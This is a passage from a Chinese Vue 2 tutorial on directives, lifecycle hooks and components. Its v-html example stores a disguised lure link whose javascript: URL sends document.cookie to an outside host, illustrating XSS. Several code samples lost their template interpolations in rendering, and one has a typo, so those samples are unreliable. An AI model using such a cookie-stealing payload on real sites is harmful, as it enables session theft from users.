    <span class="nt">&lt;div</span> <span class="na">v-html=</span><span class="s">"str2"</span><span class="nt">&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">str</span><span class="p">:</span><span class="dl">'</span><span class="s1">&lt;h3&gt;你好啊！&lt;/h3&gt;</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">str2</span><span class="p">:</span><span class="dl">'</span><span class="s1">&lt;a href=javascript:location.href="http://www.baidu.com?"+document.cookie&gt;兄弟我找到你想要的资源了，快来！&lt;/a&gt;</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>v-cloak指令（没有值）：</strong></p><ul><li>本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。</li><li>使用css配合v-cloak可以解决网速慢时页面展示出的问题。</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">style</span><span class="nt">&gt;</span>
    <span class="o">[</span><span class="nt">v-cloak</span><span class="o">]</span><span class="p">{</span>
        <span class="nl">display</span><span class="p">:</span><span class="nb">none</span><span class="p">;</span>
    <span class="p">}</span>
<span class="nt">&lt;/</span><span class="k">style</span><span class="nt">&gt;</span>
<span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-cloak</span><span class="nt">&gt;&lt;/h2&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"http://localhost:8080/resource/5s/vue.js"</span><span class="nt">&gt;&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>v-once指令：</strong>(用的少)</p><ul><li>v-once所在节点在初次动态渲染后，就视为静态内容了。</li><li>以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-once</span><span class="nt">&gt;</span>初始化的n值是:<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2&gt;</span>当前的n值是:<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"n++"</span><span class="nt">&gt;</span>点我n+1<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">n</span><span class="p">:</span><span class="mi">1</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>v-pre指令：</strong>(比较没用)</p><ul><li>跳过其所在节点的编译过程</li><li>可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译</li></ul><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;h2</span> <span class="na">v-pre</span><span class="nt">&gt;</span>Vue其实很简单<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;h2</span> <span class="nt">&gt;</span>当前的n值是:<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;button</span> <span class="err">@</span><span class="na">click=</span><span class="s">"n++"</span><span class="nt">&gt;</span>点我n+1<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">n</span><span class="p">:</span><span class="mi">1</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><h2 id="118-自定义指令">1.18 自定义指令</h2><p>需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</p><p>需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</p><p><strong>语法：</strong></p><p>局部指令：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">directives</span><span class="p">:</span> <span class="p">{</span>
  <span class="nl">focus</span><span class="p">:</span> <span class="p">{</span>
    <span class="c1">// 指令的定义</span>
    <span class="na">inserted</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">el</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">el</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p>全局指令：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
    <span class="c1">// 注册一个全局自定义指令 `v-focus`</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">directive</span><span class="p">(</span><span class="dl">'</span><span class="s1">focus</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="c1">// 当被绑定的元素插入到 DOM 中时……</span>
        <span class="na">inserted</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">el</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// 聚焦元素</span>
            <span class="nx">el</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>配置对象中常用的3个回调：</p><ul><li>bind：指令与元素成功绑定时调用。</li><li>inserted：指令所在元素被插入页面时调用。</li><li>update：指令所在模板结构被重新解析时调用。</li></ul><blockquote><p>理解这三个的调用时机，需要进一步了解 vue 的生命周期，下面会介绍。</p></blockquote><p>定义全局指令</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">v-fbind:value=</span><span class="s">"n"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

    <span class="c1">//定义全局指令</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">directive</span><span class="p">(</span><span class="dl">'</span><span class="s1">fbind</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
        <span class="c1">// 指令与元素成功绑定时（一上来）</span>
        <span class="nx">bind</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">){</span>
            <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
        <span class="p">},</span>
        <span class="c1">// 指令所在元素被插入页面时</span>
        <span class="nx">inserted</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">){</span>
            <span class="nx">element</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
        <span class="p">},</span>
        <span class="c1">// 指令所在的模板被重新解析时</span>
        <span class="nx">update</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">binding</span><span class="p">){</span>
            <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
        <span class="p">}</span>
    <span class="p">})</span>
    
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span><span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:{</span>
            <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">n</span><span class="p">:</span> <span class="mi">1</span>
        <span class="p">}</span>
    <span class="p">})</span>

<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p>局部指令：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
    <span class="na">el</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">data</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">n</span><span class="p">:</span><span class="mi">1</span>
    <span class="p">},</span>
    <span class="na">directives</span><span class="p">:</span> <span class="p">{</span>
        <span class="c1">// big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。</span>
        <span class="cm">/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */</span>
        <span class="nx">big</span> <span class="p">(</span><span class="nx">element</span><span class="p">,</span><span class="nx">binding</span><span class="p">){</span>
            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">big</span><span class="dl">'</span><span class="p">,</span><span class="k">this</span><span class="p">)</span> <span class="c1">//注意此处的this是window</span>
            <span class="c1">// console.log('big')</span>
            <span class="nx">element</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span> <span class="o">*</span> <span class="mi">10</span>
        <span class="p">},</span>
        <span class="na">fbind</span><span class="p">:</span> <span class="p">{</span>
            <span class="c1">//指令与元素成功绑定时（一上来）</span>
            <span class="nx">bind</span> <span class="p">(</span><span class="nx">element</span><span class="p">,</span><span class="nx">binding</span><span class="p">){</span>
                <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
            <span class="p">},</span>
            <span class="c1">//指令所在元素被插入页面时</span>
            <span class="nx">inserted</span> <span class="p">(</span><span class="nx">element</span><span class="p">,</span><span class="nx">binding</span><span class="p">){</span>
                <span class="nx">element</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
            <span class="p">},</span>
            <span class="c1">//指令所在的模板被重新解析时</span>
            <span class="nx">update</span> <span class="p">(</span><span class="nx">element</span><span class="p">,</span><span class="nx">binding</span><span class="p">){</span>
                <span class="nx">element</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">binding</span><span class="p">.</span><span class="nx">value</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div><h2 id="119-生命周期">1.19 生命周期</h2><h3 id="简介生命周期">简介生命周期</h3><p>Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -&gt; 渲染、更新 -&gt; 渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。</p><p>先来一张尚硅谷的图：</p><p><img src="C:\Users\28318\Desktop\vue\vue_basic\17_生命周期\生命周期.png" alt="生命周期" /></p><ol><li><strong>beforeCreate（创建前）</strong>：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event/watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。</li><li><strong>created（创建后）</strong>：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，但是此时渲染得节点还未挂载到 DOM，所以不能访问到 <code class="language-plaintext highlighter-rouge">$el</code>属性。</li><li><strong>beforeMount（挂载前）</strong>：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。</li><li><strong>mounted（挂载后）</strong>：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在这个钩子函数中对DOM的操作可以有效，但要尽量避免。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等</li><li><strong>beforeUpdate（更新前）</strong>：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。</li><li><strong>updated（更新后）</strong> ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。</li><li><strong>beforeDestroy（销毁前）</strong>：实例销毁之前调用。这一步，实例仍然完全可用，<code class="language-plaintext highlighter-rouge">this</code> 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。</li><li><strong>destroyed（销毁后）</strong>：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。</li></ol><blockquote><p>来讲一下图中间大框框的内容</p></blockquote><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401171626729.png" alt="image-20220401171626729" /></p><p>先判断有没有 <strong>el</strong> 这个配置项，没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。有 <strong>el</strong> 这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板，来个对比图。</p><p>没编译前的：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172054462.png" alt="image-20220401172054462" /></p><p>编译后：</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172220994.png" alt="image-20220401172220994" /></p><p>这个 template 有啥用咧？</p><p><strong>第一种情况，有 template：</strong></p><p>如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。</p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172847083.png" alt="image-20220401172847083" /></p><p><img src="C:\Users\28318\AppData\Roaming\Typora\typora-user-images\image-20220401172859613.png" alt="image-20220401172859613" /></p><p><strong>第二种情况，没有 template：</strong></p><p>没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去。</p><h2 id="120-非单文件组件">1.20 非单文件组件</h2><h3 id="基本使用">基本使用</h3><p>Vue中使用组件的三大步骤：</p><ul><li>定义组件(创建组件)</li><li>注册组件</li><li>使用组件(写组件标签)</li></ul><p><strong>定义组件</strong></p><p>使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</p><p>区别如下：</p><ul><li>el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</li><li>data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。</li></ul><p>讲解一下面试小问题：data必须写成函数：</p><p>这是 js 底层设计的原因：举个例子</p><blockquote><p>对象形式</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="na">a</span><span class="p">:</span> <span class="mi">99</span><span class="p">,</span>
    <span class="na">b</span><span class="p">:</span> <span class="mi">100</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
<span class="c1">// x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">66</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">loh</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span> <span class="c1">// a:66 b:100</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span> <span class="c1">// a:66 b:100</span>
</code></pre></div></div><blockquote><p>函数形式</p></blockquote><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="na">a</span><span class="p">:</span> <span class="mi">99</span><span class="p">,</span>
        <span class="na">b</span><span class="p">:</span> <span class="mi">100</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">data</span><span class="p">();</span>
<span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="nx">data</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span> <span class="o">===</span> <span class="nx">y</span><span class="p">);</span> <span class="c1">// false</span>
<span class="c1">// 我的理解是函数每调用一次就创建一个新的对象返回给他们</span>
</code></pre></div></div><blockquote><p>备注：使用template可以配置组件结构。</p></blockquote><p>创建一个组件案例：Vue.extend() 创建</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>

    <span class="c1">//第一步：创建school组件</span>
    <span class="kd">const</span> <span class="nx">school</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`
				&lt;div class="demo"&gt;
					&lt;h2&gt;学校名称：&lt;/h2&gt;
					&lt;h2&gt;学校地址：&lt;/h2&gt;
					&lt;button @click="showName"&gt;点我提示学校名&lt;/button&gt;	
    &lt;/div&gt;
			`</span><span class="p">,</span>
        <span class="c1">// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span>
        <span class="nx">data</span><span class="p">(){</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="na">schoolName</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">address</span><span class="p">:</span><span class="dl">'</span><span class="s1">北京昌平</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="na">methods</span><span class="p">:</span> <span class="p">{</span>
            <span class="nx">showName</span><span class="p">(){</span>
                <span class="nx">alert</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">schoolName</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">},</span>
    <span class="p">})</span>

    <span class="c1">//第一步：创建student组件</span>
    <span class="kd">const</span> <span class="nx">student</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`
				&lt;div&gt;
					&lt;h2&gt;学生姓名：&lt;/h2&gt;
					&lt;h2&gt;学生年龄：&lt;/h2&gt;
    &lt;/div&gt;
			`</span><span class="p">,</span>
        <span class="nx">data</span><span class="p">(){</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="na">studentName</span><span class="p">:</span><span class="dl">'</span><span class="s1">张三</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">age</span><span class="p">:</span><span class="mi">18</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="c1">//第一步：创建hello组件</span>
    <span class="kd">const</span> <span class="nx">hello</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`
				&lt;div&gt;	
					&lt;h2&gt;你好啊！&lt;/h2&gt;
    &lt;/div&gt;
			`</span><span class="p">,</span>
        <span class="nx">data</span><span class="p">(){</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">Tom</span><span class="dl">'</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>注册组件</strong></p><ul><li>局部注册：靠new Vue的时候传入components选项</li><li>全局注册：靠Vue.component(‘组件名’,组件)</li></ul><blockquote><p>局部注册</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="c1">//创建vm</span>
    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
        <span class="na">el</span><span class="p">:</span> <span class="dl">'</span><span class="s1">#root</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">data</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">msg</span><span class="p">:</span><span class="dl">'</span><span class="s1">你好啊！</span><span class="dl">'</span>
        <span class="p">},</span>
        <span class="c1">//第二步：注册组件（局部注册）</span>
        <span class="na">components</span><span class="p">:</span> <span class="p">{</span>
            <span class="na">school</span><span class="p">:</span> <span class="nx">school</span><span class="p">,</span>
            <span class="na">student</span><span class="p">:</span> <span class="nx">student</span>
            <span class="c1">// ES6简写形式</span>
            <span class="c1">// school,</span>
            <span class="c1">// student</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><blockquote><p>全局注册</p></blockquote><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;</span><span class="k">script</span><span class="nt">&gt;</span>
	<span class="c1">//第二步：全局注册组件</span>
	<span class="nx">Vue</span><span class="p">.</span><span class="nx">component</span><span class="p">(</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span><span class="p">,</span> <span class="nx">hello</span><span class="p">)</span>
<span class="nt">&lt;/</span><span class="k">script</span><span class="nt">&gt;</span>
</code></pre></div></div><p><strong>写组件标签</strong></p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;hello&gt;&lt;/hello&gt;</span>
    <span class="nt">&lt;hr&gt;</span>
    <span class="nt">&lt;h1&gt;&lt;/h1&gt;</span>
    <span class="nt">&lt;hr&gt;</span>
    <span class="c">&lt;!-- 第三步：编写组件标签 --&gt;</span>
    <span class="nt">&lt;school&gt;&lt;/school&gt;</span>
    <span class="nt">&lt;hr&gt;</span>
    <span class="c">&lt;!-- 第三步：编写组件标签 --&gt;</span>
    <span class="nt">&lt;student&gt;&lt;/student&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div></div><h3 id="几个注意点"><strong>几个注意点：</strong></h3><p>关于组件名：</p><p>一个单词组成：</p><ul><li>第一种写法(首字母小写)：school</li><li>第二种写法(首字母大写)：School</li></ul><p>多个单词组成：</p><ul><li>第一种写法(kebab-case命名)：my-school</li><li>第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</li></ul><blockquote><p>备注：</p><p>(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</p><p>(2).可以使用name配置项指定组件在开发者工具中呈现的名字。</p></blockquote><p>关于组件标签:</p><p>第一种写法：<school></school></p><p>第二种写法：<school></school></p><blockquote><p>备注：不用使用脚手架时，<school></school>会导致后续组件不能渲染。</p></blockquote><p>一个简写方式：</p><p>const school = Vue.extend(options) 可简写为：const school = options</p><h3 id="组件的嵌套">组件的嵌套</h3><p>比较简单，直接展示代码：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 准备好一个容器--&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"root"</span><span class="nt">&gt;</span>

<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;</span><span class="k">script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    <span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span> <span class="c1">//阻止 vue 在启动时生成生产提示。</span>

    <span class="c1">//定义student组件</span>
    <span class="kd">const</span> <span class="nx">student</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">student</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`
				&lt;div&gt;
					&lt;h2&gt;学生姓名：&lt;/h2&gt;	
					&lt;h2&gt;学生年龄：&lt;/h2&gt;	
    &lt;/div&gt;
			`</span><span class="p">,</span>
        <span class="nx">data</span><span class="p">(){</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
                <span class="na">age</span><span class="p">:</span><span class="mi">18</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="c1">//定义school组件</span>
    <span class="kd">const</span> <span class="nx">school</span> <span class="o">=</span> <span class="nx">Vue</span><span class="p">.</span><span class="nx">extend</span><span class="p">({</span>
        <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">school</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">template</span><span class="p">:</span><span class="s2">`
				&lt;div&gt;
					&lt;h2&gt;学校名称：&lt;/h2&gt;	
					&lt;h2&gt;学校地址：&lt;/h2&gt;	
					&lt;student&gt;&lt;/student&gt;
    &lt;/div&gt;
			`</span><span class="p">,</span>
        <span class="nx">data</span><span class="p">(){</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">尚硅谷</span><span class="dl">'</span><span class="p">,</span>
